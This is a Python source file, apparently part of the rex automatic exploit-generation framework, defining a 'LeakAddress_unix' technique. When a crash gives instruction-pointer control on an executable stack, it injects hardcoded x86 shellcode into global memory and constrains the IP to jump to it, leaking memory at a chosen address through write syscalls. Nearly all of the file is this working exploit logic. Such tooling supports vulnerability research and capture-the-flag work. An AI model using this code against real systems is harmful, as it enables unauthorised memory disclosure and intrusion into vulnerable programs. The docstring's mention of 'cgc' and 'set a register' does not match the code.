import logging
import claripy
from rex import Vulnerability
from ..technique import Technique
from rex.exploit import Exploit, CannotExploit

l = logging.getLogger("rex.exploit.techniques.LeakAddress_unix")

class LeakAddress(Technique):

    name = "LeakAddress_unix"

    applicable_to = ['unix']

    def apply(self, **kwargs):
        '''
        set a register with shellcode on cgc
        '''

        # can only exploit ip overwrites
        if not self.crash.one_of([Vulnerability.IP_OVERWRITE, Vulnerability.PARTIAL_IP_OVERWRITE]):
            raise CannotExploit("[%s] cannot control ip" % self.name)


        if not self.crash.project.loader.main_bin.execstack:
            raise CannotExploit("[%s] stack is not executable" % self.name)

        # try to write shellcode into global memory
        exploitReadShellCode_start = "\xeb\x03\x59\xeb\x0e\xe8\xf8\xff\xff\xff\x5b\x52\x65\x73\x75\x6c\x74\x5d\x3a\x31\xc0\x83\xc0\x04\x31\xdb\x43\x89\xc2\x83\xc2\x05\xcd\x80\x31\xc0\x83\xc0\x04\x31\xdb\x43\xb9"
        exploitReadShellCode_end   = "\x89\xc2\xcd\x80\xc3"
        target_Addr = kwargs['read_addr']
        shellcode = exploitReadShellCode_start + target_Addr +exploitReadShellCode_end
        shc_addr, shc_constraint = self._write_global_data(shellcode)
        if shc_addr is None:
            try:
                shc_addr, shc_constraint = self._read_in_global_data(shellcode)
            except CannotExploit as e:
                raise CannotExploit("[%s] cannot call read, %s" % (self.name, e.message))
            if shc_addr is None:
                raise CannotExploit("[%s] cannot write in shellcode" % self.name)

        # apply the constraint that shellcode must exist in memory
        self.crash.state.add_constraints(shc_constraint)

        # add the constraint that the ip must point at the shellcode
        self.crash.state.add_constraints(self.crash.state.ip == shc_addr)

        if not self.crash.state.satisfiable():
            raise CannotExploit("[%s] generated exploit is not satisfiable" % self.name)

        return Exploit(self.crash, bypasses_nx=False, bypasses_aslr=True)